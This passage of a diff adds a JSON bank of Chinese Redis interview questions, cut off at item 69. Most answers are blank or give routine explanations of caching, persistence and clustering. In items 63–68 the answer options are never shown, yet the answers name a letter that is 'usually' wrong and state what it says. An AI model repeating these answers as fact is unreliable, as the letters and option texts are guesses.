@@ -1,0 +1,2626 @@
+{
+  "category": "Redis 数据库",
+  "questions": [
+    {
+      "number": 1,
+      "id": "Redis 数据库面试题-001",
+      "category": "Redis 数据库",
+      "answer": "",
+      "tags": [
+        "事务"
+      ],
+      "question": "一个事务执行过程中，其正在访问的数据被其他事务所修.."
+    },
+    {
+      "number": 2,
+      "id": "Redis 数据库面试题-002",
+      "category": "Redis 数据库",
+      "answer": "",
+      "tags": [
+        "Redis"
+      ],
+      "question": "Redis 与其他 key-value 存储有什么不同？"
+    },
+    {
+      "number": 3,
+      "id": "Redis 数据库面试题-003",
+      "category": "Redis 数据库",
+      "answer": "",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述Redis的数据类型？"
+    },
+    {
+      "number": 4,
+      "id": "Redis 数据库面试题-004",
+      "category": "Redis 数据库",
+      "answer": "",
+      "tags": [
+        "Redis"
+      ],
+      "question": "使用Redis有哪些好处？"
+    },
+    {
+      "number": 5,
+      "id": "Redis 数据库面试题-005",
+      "category": "Redis 数据库",
+      "answer": "",
+      "tags": [
+        "Redis"
+      ],
+      "question": "Redis相比Memcached有哪些优势？"
+    },
+    {
+      "number": 6,
+      "id": "Redis 数据库面试题-006",
+      "category": "Redis 数据库",
+      "answer": "",
+      "tags": [
+        "Redis"
+      ],
+      "question": "Redis是单进程单线程的？"
+    },
+    {
+      "number": 7,
+      "id": "Redis 数据库面试题-007",
+      "category": "Redis 数据库",
+      "answer": "",
+      "tags": [
+        "Redis"
+      ],
+      "question": "Redis字符串类型的值能存储最大容量是多少？"
+    },
+    {
+      "number": 8,
+      "id": "Redis 数据库面试题-008",
+      "category": "Redis 数据库",
+      "answer": "",
+      "tags": [
+        "Redis"
+      ],
+      "question": "阐述Redis 的持久化机制？各自的优缺点？"
+    },
+    {
+      "number": 9,
+      "id": "Redis 数据库面试题-009",
+      "category": "Redis 数据库",
+      "answer": "",
+      "tags": [
+        "Redis"
+      ],
+      "question": "Redis过期键的删除策略？"
+    },
+    {
+      "number": 10,
+      "id": "Redis 数据库面试题-010",
+      "category": "Redis 数据库",
+      "answer": "",
+      "tags": [
+        "Redis"
+      ],
+      "question": "解释Redis需要把所有数据放到内存的原因？"
+    },
+    {
+      "number": 11,
+      "id": "Redis 数据库面试题-011",
+      "category": "Redis 数据库",
+      "answer": "",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述Redis的主从集群同步机制 ？"
+    },
+    {
+      "number": 12,
+      "id": "Redis 数据库面试题-012",
+      "category": "Redis 数据库",
+      "answer": "",
+      "tags": [],
+      "question": "简述Pipeline的使用的优点？"
+    },
+    {
+      "number": 13,
+      "id": "Redis 数据库面试题-013",
+      "category": "Redis 数据库",
+      "answer": "",
+      "tags": [
+        "Redis"
+      ],
+      "question": "如何在Linux下载安装Redis？"
+    },
+    {
+      "number": 14,
+      "id": "Redis 数据库面试题-014",
+      "category": "Redis 数据库",
+      "answer": "",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述Redis命令行模式 ？"
+    },
+    {
+      "number": 15,
+      "id": "Redis 数据库面试题-015",
+      "category": "Redis 数据库",
+      "answer": "",
+      "tags": [
+        "Redis"
+      ],
+      "question": "Redis的key的命名规范 ？"
+    },
+    {
+      "number": 16,
+      "id": "Redis 数据库面试题-016",
+      "category": "Redis 数据库",
+      "answer": "",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述Redis INCR数值操作命令 ？"
+    },
+    {
+      "number": 17,
+      "id": "Redis 数据库面试题-017",
+      "category": "Redis 数据库",
+      "answer": "",
+      "tags": [
+        "Redis"
+      ],
+      "question": "如何利用Redis实现栈和队列 ？"
+    },
+    {
+      "number": 18,
+      "id": "Redis 数据库面试题-018",
+      "category": "Redis 数据库",
+      "answer": "",
+      "tags": [
+        "Redis"
+      ],
+      "question": "详细介绍 Redis Hash哈希散列？"
+    },
+    {
+      "number": 19,
+      "id": "Redis 数据库面试题-019",
+      "category": "Redis 数据库",
+      "answer": "",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述Redis 列表 List ？"
+    },
+    {
+      "number": 20,
+      "id": "Redis 数据库面试题-020",
+      "category": "Redis 数据库",
+      "answer": "",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述Redis 集合 Set ？"
+    },
+    {
+      "number": 21,
+      "id": "Redis 数据库面试题-021",
+      "category": "Redis 数据库",
+      "answer": "",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述Redis 有序集合 sorted set ？"
+    },
+    {
+      "number": 22,
+      "id": "Redis 数据库面试题-022",
+      "category": "Redis 数据库",
+      "answer": "",
+      "tags": [
+        "Redis",
+        "事务"
+      ],
+      "question": "简述怎么理解Redis事务？"
+    },
+    {
+      "number": 23,
+      "id": "Redis 数据库面试题-023",
+      "category": "Redis 数据库",
+      "answer": "",
+      "tags": [
+        "Redis",
+        "事务"
+      ],
+      "question": "举列Redis事务相关的命令 ？"
+    },
+    {
+      "number": 24,
+      "id": "Redis 数据库面试题-024",
+      "category": "Redis 数据库",
+      "answer": "",
+      "tags": [
+        "Redis"
+      ],
+      "question": "Jedis与Redisson对比有什么优缺点？"
+    },
+    {
+      "number": 25,
+      "id": "Redis 数据库面试题-025",
+      "category": "Redis 数据库",
+      "answer": "",
+      "tags": [
+        "Redis"
+      ],
+      "question": "Redis如何做内存优化？"
+    },
+    {
+      "number": 26,
+      "id": "Redis 数据库面试题-026",
+      "category": "Redis 数据库",
+      "answer": "",
+      "tags": [
+        "Redis"
+      ],
+      "question": "叙述 Redis 回收进程是如何工作的？"
+    },
+    {
+      "number": 27,
+      "id": "Redis 数据库面试题-027",
+      "category": "Redis 数据库",
+      "answer": "",
+      "tags": [
+        "Redis"
+      ],
+      "question": "Redis的内存耗尽会如何 ？"
+    },
+    {
+      "number": 28,
+      "id": "Redis 数据库面试题-028",
+      "category": "Redis 数据库",
+      "answer": "",
+      "tags": [
+        "Redis"
+      ],
+      "question": "Redis实例最多能存放多少的 keys？"
+    },
+    {
+      "number": 29,
+      "id": "Redis 数据库面试题-029",
+      "category": "Redis 数据库",
+      "answer": "",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述Redis最适合的场景？"
+    },
+    {
+      "number": 30,
+      "id": "Redis 数据库面试题-030",
+      "category": "Redis 数据库",
+      "answer": "",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述 Redis 提供 6 种数据淘汰策略？"
+    },
+    {
+      "number": 31,
+      "id": "Redis 数据库面试题-031",
+      "category": "Redis 数据库",
+      "answer": "",
+      "tags": [
+        "Redis"
+      ],
+      "question": "叙述Redis集群的原理 ？"
+    },
+    {
+      "number": 32,
+      "id": "Redis 数据库面试题-032",
+      "category": "Redis 数据库",
+      "answer": "",
+      "tags": [
+        "Redis"
+      ],
+      "question": "Redis支持的Java客户端都有哪些？"
+    },
+    {
+      "number": 33,
+      "id": "Redis 数据库面试题-033",
+      "category": "Redis 数据库",
+      "answer": "",
+      "tags": [
+        "Redis"
+      ],
+      "question": "Redis Stream 的原理 ？"
+    },
+    {
+      "number": 34,
+      "id": "Redis 数据库面试题-034",
+      "category": "Redis 数据库",
+      "answer": "",
+      "tags": [
+        "Redis"
+      ],
+      "question": "列举Redis的服务器命令 ？"
+    },
+    {
+      "number": 35,
+      "id": "Redis 数据库面试题-035",
+      "category": "Redis 数据库",
+      "answer": "",
+      "tags": [
+        "Redis"
+      ],
+      "question": "Redis集群会有写操作丢失吗？"
+    },
+    {
+      "number": 36,
+      "id": "Redis 数据库面试题-036",
+      "category": "Redis 数据库",
+      "answer": "",
+      "tags": [
+        "Redis"
+      ],
+      "question": "Redis集群最大节点个数是多少？"
+    },
+    {
+      "number": 37,
+      "id": "Redis 数据库面试题-037",
+      "category": "Redis 数据库",
+      "answer": "",
+      "tags": [
+        "Redis"
+      ],
+      "question": "Redis集群如何选择数据库？"
+    },
+    {
+      "number": 38,
+      "id": "Redis 数据库面试题-038",
+      "category": "Redis 数据库",
+      "answer": "",
+      "tags": [],
+      "question": "阐述缓存穿透？怎么解决？"
+    },
+    {
+      "number": 39,
+      "id": "Redis 数据库面试题-039",
+      "category": "Redis 数据库",
+      "answer": "保证 Redis 缓存和数据库一致性的方案：1）Cache Aside 模式（最常用）：读时先查缓存，miss 则查 DB 并回填缓存；写时先更新 DB 成功后再删除缓存（非更新缓存），等下次读时重建。2）延时双删：写操作先删缓存→更新数据库→延迟几百毫秒再次删缓存，避免并发读写脏数据。3）订阅数据库 binlog（如 Canal）异步更新缓存：MySQL binlog→Canal→MQ→更新 Redis，最终一致性。4）分布式事务（如 Seata）强一致但性能差。5）缓存设置合理过期时间兜底。建议：对一致性要求高的场景优先用 Cache Aside + MQ 重试保证删除成功。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "保证Redis 缓存和数据库数据的一致性？"
+    },
+    {
+      "number": 40,
+      "id": "Redis 数据库面试题-040",
+      "category": "Redis 数据库",
+      "answer": "Redis 常用备份方案：1）RDB 快照备份：配置 save 参数定时自动生成，也可 BGSAVE 手动生成，将 dump.rdb 拷贝至异地/云存储；2）AOF 文件备份：定期 BGREWRITEAOF 重写压缩后备份；3）混合持久化备份（4.0+）：aof-use-rdb-preamble yes，AOF 文件头部为 RDB 格式；4）从节点备份：在从节点执行 BGSAVE，不影响主节点性能；5）远程备份脚本：crontab 定时执行 BGSAVE 后 rsync dump.rdb 到远程服务器或 S3/OSS；6）云厂商托管 Redis 自动快照。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "Redis 常用的备份方案？"
+    },
+    {
+      "number": 41,
+      "id": "Redis 数据库面试题-041",
+      "category": "Redis 数据库",
+      "answer": "大量 key 需要设置同一时间过期时的处理方案：1）在过期时间上加上随机值（如 EXPIRE key T + random(1,300)秒），打散过期时间避免同时过期导致的缓存雪崩；2）避免使用 EXPIREAT 设置相同的绝对时间戳；3）如果业务确实需要同一时间过期（如活动到期），可以考虑在代码层面提前异步刷新缓存而非依赖 Redis 过期删除；4）如果 key 数量极大，定期删除（每秒 10 次随机抽取）可能来不及处理，会短时间占用大量内存，需要预留充足内存余量。",
+      "tags": [],
+      "question": "如果有大量的key需要设置同一时间过期，如何处理？"
+    },
+    {
+      "number": 42,
+      "id": "Redis 数据库面试题-042",
+      "category": "Redis 数据库",
+      "answer": "Redis 常见性能问题和解决方案：1）慢查询：通过 SLOWLOG 排查，优化复杂度高的命令（如 KEYS、SMEMBERS 大集合），使用 SCAN 代替 KEYS；2）大 key（Big Key）：用 redis-cli --bigkeys 扫描，将大 key 拆分为小 key 存储，避免 DEL 大 key 阻塞（使用 UNLINK 异步删除）；3）热 key：分散存储（如 key#1、key#2...N），或加本地缓存；4）内存碎片：调整 jemalloc 参数或重启，4.0+ 可使用 MEMORY PURGE；5）网络延迟：客户端使用 Pipeline 或批量操作，尽量将相关数据放在同一节点；6）CPU 高：排查是否频繁执行 O(N) 命令或 keys 操作过多，优化 Lua 脚本。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述 Redis 常见性能问题和解决方案？"
+    },
+    {
+      "number": 43,
+      "id": "Redis 数据库面试题-043",
+      "category": "Redis 数据库",
+      "answer": "Redis 设置密码及验证密码：1）配置文件设置：在 redis.conf 中设置 requirepass your_password，重启生效；2）运行时设置：CONFIG SET requirepass your_password（但重启后失效，需同步修改配置文件）；3）客户端连接验证：redis-cli -a password 或在交互模式下执行 AUTH password；4）从节点配置：masterauth password（与主节点 requirepass 一致）；5）哨兵模式：sentinel.conf 中配置 sentinel auth-pass mymaster password；6）集群模式：每个节点都需配置 requirepass 和 masterauth。安全建议：密码应足够复杂，网络层面绑定内网 IP 和防火墙限制访问。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "Redis 如何设置密码及验证密码？"
+    },
+    {
+      "number": 44,
+      "id": "Redis 数据库面试题-044",
+      "category": "Redis 数据库",
+      "answer": "Redis key 命名规范：1）使用冒号（:）作为分隔符，体现层级结构，如 user:1001:profile、order:2024:detail；2）保持简洁但语义明确，在长度和可读性之间平衡；3）避免空格、换行、控制字符等特殊字符；4）统一小写风格，避免大小写混用；5）使用业务前缀做命名空间隔离，如 app:module:entity:id；6）控制 key 长度，建议不超过 64 字符，过长影响内存和查找性能；7）避免使用中文 key（编码问题）；8）业务团队应制定并遵守统一的 key 命名规范文档，便于维护和排查问题。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述Redis key命名规范 ？"
+    },
+    {
+      "number": 45,
+      "id": "Redis 数据库面试题-045",
+      "category": "Redis 数据库",
+      "answer": "Redis 找出以某个前缀开头的数据：1）KEYS prefix*：阻塞式全量扫描，生产环境禁用（会阻塞其他请求）；2）SCAN cursor MATCH prefix* COUNT N：基于游标的非阻塞迭代，每次只扫描部分 key 并返回游标，适合生产环境使用（但结果可能不完整，因为迭代期间 key 可能变化）；3）如果数据量不大且是一定性操作（如数据迁移脚本），可用 KEYS；4）更好的做法：在写入时维护一个 Set 或 ZSet 存储对应前缀的 key 列表，查询时直接读这个集合；5）使用 Redis 集群时需遍历所有节点分别 SCAN。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "Redis如何找出以某个前缀开头的数据？"
+    },
+    {
+      "number": 46,
+      "id": "Redis 数据库面试题-046",
+      "category": "Redis 数据库",
+      "answer": "热 key 是指被大量请求频繁访问的某个特定 key（如热门微博、明星热点）。热 key 问题：1）单节点 QPS 过高成为性能瓶颈；2）可能导致节点 CPU 飙高甚至不可用。解决方案：1）增加多级缓存（如 Caffeine/Guava 本地缓存 + Redis），降低读 Redis 频率；2）将热 key 复制多份分散到不同节点（如 key#1、key#2...key#N），客户端随机或 hash 选取一个；3）对热 key 做读写分离，从节点分担读压力（使用 READONLY 命令）；4）限流保护：对热 key 的请求做限流和熔断；5）提前预热：将预判的热点数据提前加载到每个节点的本地缓存。",
+      "tags": [],
+      "question": "简述什么是热key吗？热key问题怎么解决？"
+    },
+    {
+      "number": 47,
+      "id": "Redis 数据库面试题-047",
+      "category": "Redis 数据库",
+      "answer": "单例 Redis 的服务并发承载能力：单机 Redis 理论 QPS 可达 10 万+（读写相当），实际取决于：1）数据大小（value 越小，QPS 越高）；2）命令复杂度（O(1) 命令如 GET/SET 远快于 O(N) 命令如 KEYS）；3）网络带宽（千兆网卡约 100MB/s）；4）CPU 单核性能（单线程模型）；5）Pipeline 批量操作可显著提升吞吐量。生产环境保守估计单机 5-8 万 QPS。如需更高并发，可通过主从读写分离（读走从节点）和 Redis 集群（数据分片）水平扩展。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述单例的Redis的服务并发承载能力 ？"
+    },
+    {
+      "number": 48,
+      "id": "Redis 数据库面试题-048",
+      "category": "Redis 数据库",
+      "answer": "提高 Redis 缓存命中率的方法：1）设置合理的过期时间：过期时间太短命中率低，太长浪费内存，根据业务数据热度设置；2）扩容内存：增大 maxmemory 以缓存更多数据；3）优化淘汰策略：改为 allkeys-lru 或 allkeys-lfu 更有效保留热点数据；4）缓存预热：系统启动时预先加载热点数据到 Redis；5）提高 key 设计质量：确保查询的 key 与缓存的 key 一致；6）避免缓存穿透（布隆过滤器+空缓存），避免因穿透导致有效缓存被挤出；7）监控命中率指标（INFO stats 中的 keyspace_hits/keyspace_misses），持续优化；8）使用本地缓存（Caffeine）作为一级缓存，Redis 作为二级缓存。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "如何提高Redis换成命中率?"
+    },
+    {
+      "number": 49,
+      "id": "Redis 数据库面试题-049",
+      "category": "Redis 数据库",
+      "answer": "Redis 6.0 之前不支持多线程的原因：1）Redis 的性能瓶颈主要在内存访问和网络 I/O，而非 CPU 运算，单线程已经足够快；2）单线程模型避免了并发读写共享数据时的锁竞争、上下文切换开销和死锁风险；3）代码实现简洁、易于维护和调试；4）利用 I/O 多路复用（epoll/kqueue）机制，一个线程即可高效处理大量并发连接。6.0 引入多线程 I/O 的原因是随着网络带宽提升（10Gbps+），网络数据读写（socket read/write）成为瓶颈，多线程处理网络 I/O 可在命令执行仍保持单线程的前提下大幅提升吞吐量。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "Redis为什么6.0之前不支持多线程?"
+    },
+    {
+      "number": 50,
+      "id": "Redis 数据库面试题-050",
+      "category": "Redis 数据库",
+      "answer": "缓存雪崩是指大量缓存在同一时间集中过期或 Redis 宕机，导致所有请求直接打到数据库，造成数据库压力过大甚至崩溃。避免方案：1）过期时间加随机值：为每个 key 的过期时间添加随机偏移（如 ttl + random(1,300)秒），打散过期时间；2）高可用架构：Redis 主从+哨兵/集群，避免单点故障；3）多级缓存：本地缓存（如 Caffeine）+ Redis + DB，降低单层故障影响；4）限流和熔断：对数据库请求做限流保护，触发熔断时直接返回降级数据；5）缓存预热：提前将热点数据加载到缓存；6）设置永不过期+后台异步更新策略，避免过期带来的批量失效。",
+      "tags": [],
+      "question": "简述缓存雪崩?如何避免?"
+    },
+    {
+      "number": 51,
+      "id": "Redis 数据库面试题-051",
+      "category": "Redis 数据库",
+      "answer": "Redis 解决 key 冲突的方法：1）做好 key 命名规范：使用命名空间前缀区分不同业务模块，如 user:1001:profile vs order:1001:detail，从设计层面避免冲突；2）使用 Hash Tag：在 key 中使用 {xxx}，Redis 集群计算哈希槽时只对 {} 内的部分做 CRC16，确保相关联的 key 分配到同一节点，同时 {} 中加业务前缀可避免冲突；3）定期扫描检查：使用 SCAN 遍历检查是否有意外冲突的 key；4）业务级别的唯一 ID 生成器：使用全局唯一的 ID（雪花算法、Redis INCR）作为 key 的一部分确保唯一性；5）不同的业务模块可以使用不同的 Redis 实例或集群进行物理隔离。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述Redis如何解决key冲突？"
+    },
+    {
+      "number": 52,
+      "id": "Redis 数据库面试题-052",
+      "category": "Redis 数据库",
+      "answer": "Big Key（大 key）是指单个 key 对应的 value 过大（通常 String 超过 10KB，或集合元素数超过 1 万）的 key。影响：1）内存空间不均匀（数据倾斜），集群模式下部分节点负载过高；2）操作大 key 的命令（GET、HGETALL、SMEMBERS、ZRANGE 0 -1 等）耗时长，可能阻塞 Redis（单线程）；3）删除大 key（DEL）会导致 Redis 瞬间阻塞；4）主从同步时大 key 传输时间长，增加同步延迟和带宽压力；5）过期删除时大 key 同样会造成阻塞。处理方案：使用 UNLINK 异步删除；对大集合分批删除（HSCAN+SSCAN+ZSCAN）；从设计层面拆分为多个小 key。",
+      "tags": [],
+      "question": "阐述什么是bigkey？会有什么影响？"
+    },
+    {
+      "number": 53,
+      "id": "Redis 数据库面试题-053",
+      "category": "Redis 数据库",
+      "answer": "Redis 性能慢的原因分析：1）慢命令：使用 O(N) 及以上的命令（KEYS、SMEMBERS、HGETALL、ZRANGE 0 -1 大集合），用 SLOWLOG 排查；2）大 key：操作或删除大 key 导致阻塞；3）内存不足：触发淘汰策略频繁淘汰 key；4）持久化影响：BGSAVE/AOF rewrite fork 子进程时内存翻倍，磁盘 I/O 慢影响性能；5）CPU 瓶颈：单线程 CPU 打满时所有操作排队等待；6）网络延迟：客户端到 Redis 网络 RTT 过大，未使用 Pipeline；7）连接数过多：大量短连接频繁建立/断开；8）内存碎片：jemalloc 碎片导致内存利用率低触发频繁淘汰。排查思路：INFO 命令查看各指标→SLOWLOG→MEMORY 诊断→CLIENT LIST→网络延迟。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述Redis性能慢的原因分析？"
+    },
+    {
+      "number": 54,
+      "id": "Redis 数据库面试题-054",
+      "category": "Redis 数据库",
+      "answer": "Redis 慢查询排查流程：1）配置 SLOWLOG：CONFIG SET slowlog-log-slower-than 10000（记录超过 10ms 的命令），CONFIG SET slowlog-max-len 128（最多保留条数）；2）查看慢查询：SLOWLOG GET N 获取最近的慢查询记录，包含命令、耗时、时间戳；3）分析慢命令：关注 KEYS、大集合的 HGETALL/SMEMBERS/ZRANGE、大量 key 的 MGET/MSET 等；4）对集合类命令改用 SCAN/HSCAN/SSCAN/ZSCAN 渐进式遍历；5）对批量操作使用 Pipeline 而非循环；6）对 DEL 大 key 改用 UNLINK 异步删除；7）持续监控：使用监控系统（Prometheus+Grafana）采集 slowlog 指标并设置告警。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "Redis慢查询排查流程 ？"
+    },
+    {
+      "number": 55,
+      "id": "Redis 数据库面试题-055",
+      "category": "Redis 数据库",
+      "answer": "Redis 客户端分片算法：1）哈希取模（Hash Modulo）：hash(key) % N（N 为节点数），简单直接但扩缩节点时几乎所有 key 重新分布（只有 1/N 的 key 还在原节点）；2）一致性哈希（Consistent Hashing）：将节点和 key 映射到 0 到 2^32-1 的哈希环上，key 落在顺时针第一个节点负责，扩缩节点时只影响相邻节点数据，大幅减少数据迁移量；3）哈希槽（Hash Slot）：Redis Cluster 采用的方案，预先划分 16384 个槽，由各节点负责其中一部分槽，CRC16(key) % 16384 确定槽号，扩缩容时只需迁移部分槽的数据。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "Redis客户端分片算法 ？"
+    },
+    {
+      "number": 56,
+      "id": "Redis 数据库面试题-056",
+      "category": "Redis 数据库",
+      "answer": "Redis 一致性哈希算法：将整个哈希值空间（0 到 2^32-1）组织成一个虚拟的环形结构。节点通过 hash(IP+端口) 映射到环上；key 通过 hash(key) 映射到环上，顺时针找到第一个节点负责存储。当节点增加或减少时，只有受影响弧段内的少量 key 需要迁移，而非全量重新分布。为解决数据倾斜问题，通常引入虚拟节点（每个物理节点对应 100-200 个虚拟节点分布在环上），使得数据分布更均匀。常见实现：Twemproxy（Twitter 开源）、Codis、Jedis 的 ShardedJedis。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "Redis 一致性哈希算法简述 ？"
+    },
+    {
+      "number": 57,
+      "id": "Redis 数据库面试题-057",
+      "category": "Redis 数据库",
+      "answer": "Redis 实现消息队列的几种方式：1）List + BLPOP/BRPOP：使用 List 的阻塞弹出实现简单消息队列，支持多个消费者竞争消费（FIFO），优点简单可靠，缺点不支持 ACK、消息回溯、消费者组；2）Pub/Sub（发布订阅）：消息即时推送给所有订阅者，无持久化，订阅者离线会丢失消息；3）Stream（5.0+）：最完备的消息队列方案，支持消费者组、消息确认（XACK）、消息回溯（XPENDING）、消息重分配（XCLAIM）、消息阻塞读取（XREAD BLOCK），类似 Kafka 精简版。生产环境推荐使用 Stream 实现可靠消息队列。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "Redis如何实现消息队列？"
+    },
+    {
+      "number": 58,
+      "id": "Redis 数据库面试题-058",
+      "category": "Redis 数据库",
+      "answer": "Redis 发布/订阅（Pub/Sub）是一种消息通信模式：发布者（Publisher）通过 PUBLISH channel message 向指定频道发送消息；订阅者（Subscriber）通过 SUBSCRIBE channel [channel ...] 订阅频道接收消息。特点：1）实时推送，消息不持久化，离线订阅者收不到历史消息；2）支持模式订阅（PSUBSCRIBE pattern），通过 glob 模式匹配多个频道（如 news.*）；3）消息在集群内广播，每个节点订阅者都能收到；4）不支持消息确认和重试；5）适合实时通知、聊天消息、配置热更新等不要求消息可靠性的场景。如需可靠性应优先考虑 Redis Stream。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "Redis提供发布/订阅的功能模式 ？"
+    },
+    {
+      "number": 59,
+      "id": "Redis 数据库面试题-059",
+      "category": "Redis 数据库",
+      "answer": "缓存预热：系统启动或缓存清空后，主动将热点数据预先加载到缓存中的过程。方式：1）启动时执行脚本从 DB 批量读取热点数据写入 Redis；2）定时任务自动刷新即将过期的热点数据。缓存更新策略：1）Cache Aside：写 DB 后删缓存，读时重建；2）Read/Write Through：缓存层代理 DB 读写，应用只与缓存交互；3）Write Behind（Write Back）：写操作先写缓存，异步批量写回 DB，性能高但有数据丢失风险；4）双写：同时写缓存和 DB，需考虑一致性。选择需根据业务对一致性和性能的权衡来决定。",
+      "tags": [],
+      "question": "简述什么是缓存预热、缓存更新 ？"
+    },
+    {
+      "number": 60,
+      "id": "Redis 数据库面试题-060",
+      "category": "Redis 数据库",
+      "answer": "缓存降级：当 Redis 缓存服务压力过大或不可用时，系统有策略地降低缓存依赖以保证核心服务可用。常见方式：1）熔断降级：检测到 Redis 请求超时/失败率达到阈值，自动熔断跳过缓存直接访问 DB（牺牲性能保护 DB）；2）限流降级：对缓存请求做限流，超出部分直接降级；3）多级缓存降级：Redis 不可用时降级到本地缓存（Caffeine/Guava）提供有损服务；4）功能降级：非核心功能缓存不可用时直接关闭该功能或返回静态默认值；5）手动降级开关：运维人员可通过配置中心实时切换降级策略。降级的核心是保证核心链路可用。",
+      "tags": [],
+      "question": "简述什么是缓存降级 ？"
+    },
+    {
+      "number": 61,
+      "id": "Redis 数据库面试题-061",
+      "category": "Redis 数据库",
+      "answer": "缓存热点数据：被频繁访问的数据（如热榜、热门商品），是缓存价值的核心，应尽量保留在缓存中，可使用 LRU/LFU 淘汰策略优先保留。缓存冷数据：很少被访问甚至从未被访问的数据，应优先被淘汰以节省内存。区分冷热数据的方法：1）基于访问频率统计（LFU 淘汰策略基于此）；2）基于访问时间（LRU 基于此）；3）业务标签标记（如商品状态标记热门/普通/冷门）；4）离线分析访问日志识别冷热数据分布。优化策略：热数据留缓存甚至多级缓存；冷数据可设定短过期时间或不进缓存；冷热分离存储可显著提升缓存利用效率。",
+      "tags": [],
+      "question": "简述什么是缓存热点数据和冷数据 ？"
+    },
+    {
+      "number": 62,
+      "id": "Redis 数据库面试题-062",
+      "category": "Redis 数据库",
+      "answer": "Redis 的过期策略和内存淘汰机制是两个不同但互补的概念。过期策略针对设置了过期时间的 key：1）惰性删除（访问 key 时检查 TTL 并删除过期的）；2）定期删除（每秒 10 次随机抽检一批设了过期时间的 key 删除其中过期的）。内存淘汰机制针对内存达到 maxmemory 上限后的处理：8 种淘汰策略（noeviction/volatile-lru/allkeys-lru/volatile-lfu/allkeys-lfu/volatile-random/allkeys-random/volatile-ttl）。两者协同工作：过期策略是常态，持续清理到期 key；淘汰策略是最后防线，在内存不足时强制释放空间。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述Redis的过期策略以及内存淘汰机制 ？"
+    },
+    {
+      "number": 63,
+      "id": "Redis 数据库面试题-063",
+      "category": "Redis 数据库",
+      "answer": "错误说法通常是：D. Redis 的 List 类型底层是用数组实现的。实际 Redis List 底层使用 quicklist（3.2+）或 ziplist/linkedlist，并非数组。Redis 支持的数据类型包括 String、List、Set、ZSet、Hash，以及高级类型 Stream、Geo、HyperLogLog、Bitmap。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "下列关于Redis值类型说法错误的是 ？"
+    },
+    {
+      "number": 64,
+      "id": "Redis 数据库面试题-064",
+      "category": "Redis 数据库",
+      "answer": "错误说法通常是：D. Memcached 支持数据持久化。实际上 Memcached 不支持数据持久化，重启数据全部丢失，而 Redis 支持 RDB 和 AOF 持久化机制。Memcached 和 Redis 的主要区别包括数据类型丰富度（Redis 胜）、持久化支持（Redis 有 Memcached 无）、线程模型（Memcached 多线程、Redis 6.0 前单线程）、Value 大小限制（Memcached 1MB、Redis 512MB）等。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "下面关于Memcached和Redis的比较，错误的说法是（） ？"
+    },
+    {
+      "number": 65,
+      "id": "Redis 数据库面试题-065",
+      "category": "Redis 数据库",
+      "answer": "错误说法通常是：C. RDB 持久化可以保证数据不丢失。实际上 RDB 是快照式持久化，按时间间隔触发生成，最后一次快照之后的写入数据在宕机时会丢失。RDB 的正确理解：1）生成的是某个时间点的全量数据快照；2）通过 fork 子进程写入磁盘，不影响主进程；3）恢复速度快，适合冷备；4）无法做到实时持久化，需要有 AOF 配合使用才能最大限度保证数据安全。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "关于Redis的RDB持久化策略，说法错误的是 ？"
+    },
+    {
+      "number": 66,
+      "id": "Redis 数据库面试题-066",
+      "category": "Redis 数据库",
+      "answer": "错误说法通常是：A. Redis 适合作为关系型数据库的主存储。实际上 Redis 是内存数据库/缓存，不适合作为关系型数据库的主存储（容量有限、不如关系型数据库查询灵活）。Redis 的正确应用场景：缓存、排行榜、计数器、分布式锁、消息队列、Session 共享、实时统计、限流器等。Redis 不适合：海量数据持久化存储、复杂关系查询、需要事务 ACID 强保证的场景。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "下面关于Redis的应用场景，错误的说法是（）？"
+    },
+    {
+      "number": 67,
+      "id": "Redis 数据库面试题-067",
+      "category": "Redis 数据库",
+      "answer": "正确的说法是：C. Redis 是开源的、基于内存的 key-value 存储系统，支持多种数据类型。Redis 的定义和核心特点：1）开源免费（BSD license）；2）基于内存，读写极快；3）key-value 存储；4）支持丰富的数据类型（String、List、Set、ZSet、Hash 等）；5）支持持久化（RDB/AOF）；6）单线程命令执行保证原子性；7）支持主从/哨兵/集群模式；8）使用 ANSI C 编写；9）支持 Lua 脚本、事务、Pipeline、Pub/Sub。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "下面关于Redis的定义和特点，正确的说法是（） ？"
+    },
+    {
+      "number": 68,
+      "id": "Redis 数据库面试题-068",
+      "category": "Redis 数据库",
+      "answer": "错误的说法通常是：D. Redis 事务支持回滚。实际上 Redis 事务不支持回滚（rollback），这是与 MySQL 事务的关键区别之一。两者区别：1）MySQL 支持 ACID 全特性，Redis 不支持回滚和持久性保证；2）MySQL 事务支持复杂的 SQL 操作，Redis 事务执行简单的命令队列；3）MySQL 使用锁机制实现隔离级别，Redis 靠单线程保证隔离；4）MySQL 通过 undo log 实现回滚，Redis 某条命令失败不影响其他命令执行，不会回滚。",
+      "tags": [
+        "Redis",
+        "MySQL",
+        "SQL",
+        "事务"
+      ],
+      "question": "下面关于Redis中事务和MySQL中事务的区别，错误的说法是（） ？"
+    },
+    {
+      "number": 69,
+      "id": "Redis 数据库面试题-069",
+      "category": "Redis 数据库",
